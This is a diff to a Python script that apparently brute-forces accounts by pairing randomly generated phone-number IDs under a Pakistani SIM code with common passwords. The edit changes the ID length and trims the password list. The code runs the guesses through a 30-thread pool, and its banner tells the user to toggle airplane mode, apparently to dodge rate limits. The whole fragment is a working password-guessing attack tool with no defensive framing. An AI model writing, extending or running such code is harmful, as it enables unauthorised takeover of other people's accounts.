@@ -502,7 +502,7 @@ def PAKISTAN():
   else:
       mtd.append('m1')
   for nmbr in range(limit):
-    nmp = ''.join(random.choice(string.digits) for _ in range(7))
+    nmp = ''.join(random.choice(string.digits) for _ in range(9))
     user.append(nmp)
   with tred(max_workers=30) as king_xd:
     os.system('clear')
@@ -510,7 +510,7 @@ def PAKISTAN():
     ____banner____();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
       ids = kode+guru
-      pwv = ['57273200','57575751','59039200','57575752','123456','12345678','123456789','786786']
+      pwv = ['57273200']
       if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
       elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
       elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
